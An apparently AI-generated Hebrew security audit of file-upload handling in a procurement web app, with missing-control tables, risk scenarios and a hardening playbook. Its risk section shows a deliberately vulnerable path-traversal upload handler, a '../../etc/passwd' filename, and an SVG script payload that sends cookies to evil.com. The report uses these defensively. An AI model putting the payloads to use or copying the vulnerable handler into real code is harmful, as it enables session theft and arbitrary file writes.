# QA-AGENT-47 — אבטחת העלאות קבצים (File Upload Security)

**סוכן:** QA Agent #47
**תאריך:** 2026-04-11
**מימד:** File Upload Security
**היקף סקירה:** ניתוח סטטי בלבד של `server.js`, `package.json`, `web/onyx-dashboard.jsx`, תיקיית `supabase/migrations`
**מודל איום:** Hebrew-RTL procurement — עלולה להיות העלאת PDF של PO, הצעות ספקים PDF, או תרשימי blueprint

---

## TL;DR — הממצא המרכזי

**המערכת כיום אינה תומכת כלל בהעלאות קבצים.** זה גם חדשות טובות (= אין חור אבטחה פעיל להעלאות) וגם חדשות רעות (= המערכת אינה ממלאת דרישה עסקית קריטית של מערכת רכש, ושום היגיינה בסיסית לא מוטמעת — ברגע שהפיצ'ר יתווסף, הוא יתווסף "חשוף").

חומרת-על: **P1 גבוהה (פיצ'ר חסר קריטי)** + **P0 קריטית (עבור יום ההוספה הראשון של multer)**.

---

## 1. הראיות הקשות מהניתוח הסטטי

### 1.1 `package.json` (16 שורות סך הכל)
```json
"dependencies": {
  "express": "^4.21.0",
  "@supabase/supabase-js": "^2.45.0",
  "dotenv": "^16.4.5",
  "cors": "^2.8.5"
}
```

**אבסנטים קריטיים (כולם יחד = אין upload pipeline בכלל):**
- אין `multer` / `busboy` / `formidable` / `express-fileupload` / `@fastify/multipart` / `multiparty`
- אין `sharp` / `jimp` / `image-size` (= אין re-encode של תמונות, אין הגנת EXIF/XSS-image)
- אין `file-type` / `magic-bytes.js` / `mmmagic` (= אין אימות magic-bytes)
- אין `clamav.js` / `node-clamav` / שילוב VirusTotal (= אין AV scanning)
- אין `adm-zip` / `yauzl` גבול + אין `gzip-size` (= אין הגנת ZIP bomb)
- אין `express-rate-limit` / `express-slow-down` (= גם כשהפיצ'ר ייווסף, לא יהיה rate-limit על endpoint ההעלאה)
- אין `helmet` (= אין header `Content-Security-Policy` שימנע הרצה של SVG/HTML ממוסווה לקובץ)
- `@supabase/supabase-js` קיים, אבל אף פעם לא מיובא ה-`.storage` API

### 1.2 `server.js` (935 שורות) — חיפוש ממוקד
חיפוש case-insensitive של `multer|busboy|upload|formidable|FileReader|multipart|storage|bucket` → **אפס התאמות בקוד חי**. ההתאמה היחידה (`'Content-Length'` ב-helper של WhatsApp) היא שליחת JSON outbound, לא קבלת קובץ.

מפת ה-endpoints המלאה (14 מסלולים): `GET /api/status`, `GET/POST/PATCH /api/suppliers`, `POST /api/suppliers/:id/products`, `GET /api/suppliers/search/:category`, `POST/GET /api/purchase-requests`, `POST /api/rfq/send`, `GET /api/rfq/:id`, `GET /api/rfqs`, `POST /api/quotes`, `POST /api/rfq/:id/decide`, `GET/POST /api/purchase-orders`, `POST /api/purchase-orders/:id/approve`, `POST /api/purchase-orders/:id/send`, `GET/POST /api/subcontractors`, `PUT /api/subcontractors/:id/pricing`, `POST /api/subcontractors/decide`, `GET /api/analytics/*`, `GET /api/audit`, `GET/POST /webhook/whatsapp`.

**אף אחד מ-14 המסלולים לא מקבל `multipart/form-data`**. גם ה-webhook של WhatsApp (שם יכול להגיע מדיה מספקים) קורא `req.body.entry[0]` רק כ-JSON text — תמונות, PDF, קבצי קול שספקים שולחים דרך WhatsApp **נאבדים בשקט**.

### 1.3 `web/onyx-dashboard.jsx` (710 שורות)
רכיב `Input` יחיד מוגדר בשורה 596:
```jsx
function Input({ label, value, onChange, type = "text", placeholder = "" }) {
  ...
  <input type={type} value={value} onChange={e => onChange(e.target.value)} ... />
```

ה-prop `type` מועבר רק במקומות שבהם הערך הוא `"number"` (21 מופעים). **אין שום `type="file"` באפליקציה כולה**, אין `FormData`, אין `FileReader`, אין `<input accept="...">`, אין קומפוננטת drag-and-drop, אין progress bar של upload.

### 1.4 `supabase/migrations/*`
חיפוש `storage|bucket|file_url|attachment|upload|pdf|image|blob` → **אפס התאמות**. אין טבלה עם עמודה מסוג `storage_path`, אין `attachments`, אין `po_pdf_url`, אין `quote_pdf_url`, אין `blueprint_url`. סכמת ה-DB כולה טקסט + מספרים + timestamps.

---

## 2. סקירה נגד 15 הבקרות המתבקשות

| # | בקרה | מצב | חומרה |
|---|---|---|---|
| 1 | File upload endpoints — קיימים? | **לא קיימים** | P1 (פיצ'ר חסר) |
| 2 | Supabase Storage / bucket מוגדר? | **לא** — `.storage` אף פעם לא נקרא | P1 |
| 3 | הגבלת MIME type | לא רלוונטי (אין endpoint), אבל גם בפיתוח עתידי = אין תשתית | P0 (עתידי) |
| 4 | Allowlist של סיומות (לא denylist) | אין | P0 (עתידי) |
| 5 | אימות magic bytes | אין `file-type`/`mmmagic` | P0 (עתידי) |
| 6 | גבול גודל קובץ | אין `limits` ב-multer כי אין multer. `express.json()` ברירת מחדל = 100kb בלבד, אבל זה לא מגן מ-multipart | P0 (עתידי) |
| 7 | סריקת וירוסים | אין ClamAV/VirusTotal/S3 Object Lambda | P0 (עתידי) |
| 8 | Filename sanitization (`../../etc/passwd`) | אין `path.basename()`, אין `sanitize-filename` | P0 (עתידי) |
| 9 | Re-encode תמונות דרך sharp (EXIF/exploits) | אין `sharp` | P0 (עתידי) |
| 10 | Rate limit על upload | אין `express-rate-limit` בכלל — **גם 14 ה-endpoints הקיימים ללא rate-limit** | P0 |
| 11 | מכסת אחסון למשתמש | אין טבלת `user_storage_quota`, אין concept של user בכלל (אין auth) | P1 |
| 12 | מדיניות bucket ציבורי מול פרטי | לא קיים bucket | P1 (עתידי) |
| 13 | תפוגת pre-signed URL | `supabase.storage.createSignedUrl()` לא נקרא באף מקום | P1 (עתידי) |
| 14 | הגנת ZIP bomb | אין גבולות decompression | P1 (עתידי) |
| 15 | Upload progress UX | אין קומפוננטה כזו בדשבורד | P2 |

---

## 3. פערים עסקיים שנובעים מההיעדר המוחלט של העלאות

מערכת רכש של "טכנו כל עוזי" אמורה לטפל ב-artifacts הבאים — ואין אף אחד מהם:

1. **PDF של PO** — כיום `POST /api/purchase-orders/:id/send` (server.js:626–679) בונה טקסט WhatsApp עם emojis וקווים (`══════════════════`). לא PDF, לא חתימה דיגיטלית, לא watermark. רואי חשבון, עורכי דין ומכס ידרשו PDF רשמי — לא הודעת WhatsApp.
2. **הצעת מחיר שספק מחזיר** — `POST /api/quotes` (server.js:365–418) מקבל רק **JSON של line_items**. במציאות ספקים ישראליים שולחים PDF חתום / תמונה של נייר מכתבים. המערכת דורשת הקלדה ידנית של כל הצעה — זה גם UX גרוע וגם **נקודת תקלה לחשבונאות** (אין original document להוכיח מחלוקת).
3. **Blueprint / תרשים פרויקט** — טבלת `subcontractors` ו-`subcontractor_decisions` (server.js:686–798) מתארת פרויקט לפי `project_value`, `area_sqm`, `work_type` — אין מקום לצרף DWG/PDF של התכנית. קבלני משנה נותנים הצעות מחיר על בסיס תכניות, לא על בסיס מספר.
4. **מסמכי עוסק/ח"פ של ספק חדש** — `POST /api/suppliers` (server.js:149–154) מקבל `req.body` שטוח. אין אישור עוסק מורשה, אין ניכוי מס במקור, אין ביטוח צד ג'. KYC בסיסי = חייב קבצים.
5. **חשבוניות ותעודות משלוח** — אין נקודת חיבור מ-`purchase_orders` ל-`invoice_pdf_url`. כל הפיננסים שקופים לגמרי.

---

## 4. תרחישי הסיכון כשהפיצ'ר יתווסף (סימולציית "יום אחרי")

הסיכונים למטה הם **הסיכונים שהקוד חשוף אליהם ברגע שמישהו יריץ `npm install multer` ויוסיף 5 שורות**:

### 4.1 Path Traversal דרך `originalname`
```js
// הקוד הנאיבי שצפוי להיכתב:
const upload = multer({ dest: 'uploads/' });
app.post('/api/quotes/:id/attachment', upload.single('file'), (req, res) => {
  fs.renameSync(req.file.path, `uploads/${req.file.originalname}`);
});
```
**אקספלויט:** `originalname = "../../../../../etc/passwd"` → כתיבה לכל מקום. מתעצם על Windows (`..\..\Windows\System32\...`). על שרת Replit/VPS של קובי = RCE מלא.

### 4.2 Stored XSS דרך SVG/HTML masquerading
`POST /api/quotes` מקבל הצעה ממייל/WhatsApp של ספק. ספק זדוני (או ספק שהמחשב שלו נפרץ) שולח `quote.svg` עם `<script>fetch('https://evil.com?c='+document.cookie)</script>`. כשרוכש פותח `<img src="/api/quotes/42/attachment">` — או גרוע מזה, `<iframe>` — ה-SVG מתפרש כ-HTML, ועוגיות ה-supabase של הרוכש נשאבות. **אין `helmet` → אין `X-Content-Type-Options: nosniff` → IE/Edge ישנים עדיין מריצים**.

### 4.3 EXIF metadata דליפה → GDPR
קבלן משנה מצלם blueprint בסמארטפון → מעלה → מטאדטת GPS של **הבית הפרטי שלו** נחשפת בפרופיל הציבורי של הספק. אין `sharp().rotate().toBuffer()` לניקוי EXIF. מתחבר ישירות ל-QA-AGENT-26-GDPR.md (Art. 5(1)(c) — data minimization).

### 4.4 ZIP bomb של 42KB → 4.5PB
ספק שולח `po_attachments.zip` של 42KB. השרת מחלץ → דיסק 40GB של Supabase נמחק תוך 3 שניות. אין גבול `maxDecompressed`.

### 4.5 Resource exhaustion (slow-upload DoS)
גם בלי multer, אם נוסיף endpoint ללא `timeout`, תוקף פותח 200 חיבורים, שולח 1 byte/second multipart → Node event-loop נעול. אין `server.setTimeout()`, אין `express-slow-down`.

### 4.6 Unscanned malware → ransomware בתוך הארגון
פקיד רכש מוריד PDF של הצעת ספק → PDF מכיל JavaScript ב-Acrobat → ransomware. אין ClamAV לפני ההעלאה, אין re-rendering של PDF דרך `pdf-lib` + ghostscript.

### 4.7 Pre-signed URL ללא expiry (כשיהיה Supabase Storage)
Supabase default = `createSignedUrl` עם 60 שניות. אם המתכנת יעתיק StackOverflow snippet עם `expiresIn: 60 * 60 * 24 * 365` — ה-URL של הצעת מחיר דולפת מה-log של WhatsApp תישאר חיה שנה.

### 4.8 Public bucket by default
`supabase.storage.createBucket('quotes', { public: true })` — ברירת מחדל של רבים מהטוטוריאלים. כל ההצעות הופכות לאינדקסיות ב-Google.

---

## 5. אינטראקציות עם ממצאים אחרים (Cross-Wave correlation)

- **QA-WAVE1-DIRECT-FINDINGS.md שורה 213 (I-01 · Single-file React ללא Vite/build):** שדרוג Vite עתידי הוא ההזדמנות לייצוג גם של `react-dropzone` + `react-uploader` מאומתים.
- **QA-AGENT-20-LOGGING.md שורה 100 (אין request-id):** כשיתווספו העלאות, לוג של upload ללא correlation-id = בלתי אפשרי לחקור incident.
- **QA-AGENT-26-GDPR.md שורה 159 (storage limitation):** כל קובץ שעולה = נתון אישי נוסף שצריך תאריך מחיקה. עכשיו זה אפס, וגם יישאר אפס אם לא נתכנן retention מראש.
- **QA-AGENT-29-ENCRYPTION.md:** Supabase Storage מצפין at-rest אבל לא field-level. מסמך עוסק מורשה (מס' ת"ז) דורש הצפנה נוספת.
- **QA-AGENT-31-DEPS-CVE.md / QA-AGENT-32-SUPPLY-CHAIN.md:** multer היה ב-CVE-2024-45590 (DoS דרך field parsing). כל תוספת עתידית מחייבת pin + audit.

---

## 6. המלצות — "Upload Security Playbook" לקראת היום שהפיצ'ר ייבנה

### 6.1 P0 — חובה לפני deploy של upload אחד
```bash
npm install multer file-type sharp sanitize-filename express-rate-limit helmet
```
```js
const multer = require('multer');
const { fileTypeFromBuffer } = require('file-type');
const sharp = require('sharp');
const sanitize = require('sanitize-filename');
const rateLimit = require('express-rate-limit');

const upload = multer({
  storage: multer.memoryStorage(),           // לא disk
  limits: {
    fileSize: 10 * 1024 * 1024,              // 10 MB hard
    files: 5,                                 // max 5 files per request
    fieldSize: 100 * 1024,
  },
});

const uploadLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: 10,                                    // 10 uploads/min/IP
  message: 'יותר מדי העלאות — נסה בעוד דקה',
});

const ALLOWED_MIMES_QUOTES   = new Set(['application/pdf', 'image/png', 'image/jpeg']);
const ALLOWED_MIMES_BLUEPRINT = new Set(['application/pdf', 'image/png', 'image/jpeg', 'application/acad']);

app.post('/api/quotes/:id/attachment', uploadLimiter, upload.single('file'), async (req, res) => {
  const f = req.file;
  if (!f) return res.status(400).json({ error: 'אין קובץ' });

  // 1. magic-bytes (NOT mime, NOT extension)
  const detected = await fileTypeFromBuffer(f.buffer);
  if (!detected || !ALLOWED_MIMES_QUOTES.has(detected.mime)) {
    return res.status(415).json({ error: `סוג קובץ חסום: ${detected?.mime || 'לא זוהה'}` });
  }

  // 2. sanitize name + רדר UUID + ext
  const safeName = `${crypto.randomUUID()}.${detected.ext}`;

  // 3. image re-encode (strip EXIF + killer payloads)
  let finalBuf = f.buffer;
  if (detected.mime.startsWith('image/')) {
    finalBuf = await sharp(f.buffer)
      .rotate()                                // apply EXIF rotation then drop
      .resize({ width: 4000, withoutEnlargement: true })
      .toFormat(detected.ext === 'png' ? 'png' : 'jpeg', { quality: 85 })
      .toBuffer();
  }

  // 4. virus scan
  const clean = await clamAVScan(finalBuf);    // integration with clamdjs
  if (!clean) return res.status(422).json({ error: 'קובץ זוהה כזדוני' });

  // 5. upload to PRIVATE bucket
  const { error } = await supabase.storage
    .from('quotes-private')                    // bucket must be public: false
    .upload(`quote-${req.params.id}/${safeName}`, finalBuf, {
      contentType: detected.mime,
      upsert: false,
    });
  if (error) return res.status(500).json({ error: error.message });

  // 6. audit
  await audit('quote_attachment', req.params.id, 'uploaded', req.body.actor || 'api',
    `${safeName} (${(finalBuf.length / 1024).toFixed(1)} KB, ${detected.mime})`);

  res.status(201).json({ filename: safeName, size: finalBuf.length, mime: detected.mime });
});
```

### 6.2 P0 — הגדרת bucket ב-Supabase
```sql
-- migration:
insert into storage.buckets (id, name, public) values
  ('quotes-private',    'quotes-private',    false),
  ('po-pdf-private',    'po-pdf-private',    false),
  ('blueprints-private','blueprints-private',false),
  ('suppliers-kyc-private','suppliers-kyc-private', false);

-- RLS policy: רק authenticated user בעל תפקיד 'procurement' רואה
create policy "procurement_read_quotes"
  on storage.objects for select
  using ( bucket_id = 'quotes-private' and auth.role() = 'authenticated' );
```

### 6.3 P0 — pre-signed URL עם תפוגה קצרה
```js
const { data } = await supabase.storage
  .from('quotes-private')
  .createSignedUrl(path, 300);                 // 5 דקות, לא שנה
// ולרישום log: מתי URL נוצר + ל-user מי
```

### 6.4 P1 — מכסות
טבלה חדשה:
```sql
create table upload_quota (
  actor text primary key,
  bytes_used bigint default 0,
  bytes_limit bigint default 524288000,        -- 500 MB per actor
  reset_at timestamptz
);
```
trigger שמעדכן אחרי כל העלאה + `res.status(413)` כשמגיעים למגבלה.

### 6.5 P1 — defense in depth
- `helmet({ crossOriginResourcePolicy: 'same-site', contentSecurityPolicy: { ... img-src 'self' data: ... } })` לפני `app.use(cors())`.
- `app.use(express.json({ limit: '100kb' }))` → כבר ברירת מחדל, אבל להוסיף `express.urlencoded({ limit: '100kb' })` ו-`express.raw({ limit: '10mb' })` רק ל-routes ספציפיים.
- `server.setTimeout(30000)` למנוע slow-upload.
- `X-Content-Type-Options: nosniff`, `Content-Disposition: attachment` בעת הורדה.

### 6.6 P1 — UX: progress + drag-n-drop
`react-dropzone` + `XMLHttpRequest.upload.onprogress` + progress bar. Error states בעברית: "גודל חורג מ-10MB", "סוג קובץ לא נתמך", "נסיית העלאה נחסמה זמנית".

### 6.7 P2 — AV + OCR pipeline
- ClamAV container נפרד דרך `clamdjs`, או לחלופין Supabase Edge Function שקוראת ל-VirusTotal API (4 req/min חינם).
- OCR על PDFs של ספקים (`tesseract.js` בעברית) כדי שהשדה `line_items` ימלא את עצמו אוטומטית במקום הקלדה ידנית.

---

## 7. Acceptance Checklist ליום שהפיצ'ר ייצא

- [ ] `npm ls multer` → יש גרסה נעולה
- [ ] grep של `originalname` בקוד → אפס שימושים (תמיד דרך `sanitize-filename` + UUID)
- [ ] curl test: `POST` עם `../../../etc/passwd` → 400/415
- [ ] curl test: `.exe` עם MIME `image/png` → 415 (מאומת דרך magic bytes)
- [ ] curl test: 11MB file → 413
- [ ] curl test: 20 uploads ב-60 שניות → 429 מהעשירי והלאה
- [ ] test: SVG עם `<script>` → או נחסם, או מוגש עם `Content-Disposition: attachment` ו-`X-Content-Type-Options: nosniff`
- [ ] ZIP bomb 42KB → נחסם או נחתך ב-100MB decompressed
- [ ] pre-signed URL expires ב-≤ 15 דקות
- [ ] bucket `public: false` בודק ב-`storage.buckets` עמודת `public`
- [ ] GDPR retention: קובץ של ספק non-active > 7 שנים → נמחק אוטומטית (cron/Edge Function)
- [ ] audit log מכיל: uploader, size, mime, hash (SHA-256), bucket, path

---

## 8. סיכום

**בשורה אחת:** המערכת לא חשופה היום להעלאות כי אין העלאות — אבל חוסר-ההעלאות הוא עצמו פגם עסקי קריטי במערכת רכש, ואף שורת קוד, ספריה או הגדרת bucket לא מוכנות ליום שבו פיצ'ר כזה יתווסף. התיעוד למעלה הוא ה-playbook שחייב להתבצע **לפני** שה-PR הראשון של `multer` ייכתב — אחרת הוא ייכתב על בסיס StackOverflow-2015 והתוצאה תהיה קטסטרופלית לנתוני רכש רגישים.

**חומרה מצטברת:** P1 (gap) + P0 (כאשר ייבנה, ברירת המחדל תהיה לא בטוחה).

**סטטוס מוכנות:** 0/15 בקרות מיושמות. 0/8 תרחישי סיכון מכוסים. 0/12 פריטי acceptance checklist מאומתים.

---

*QA Agent #47 — ניתוח סטטי בלבד. לא נעשו בדיקות דינמיות, לא הופעלו תעופות, לא נוצרו קבצים זדוניים.*
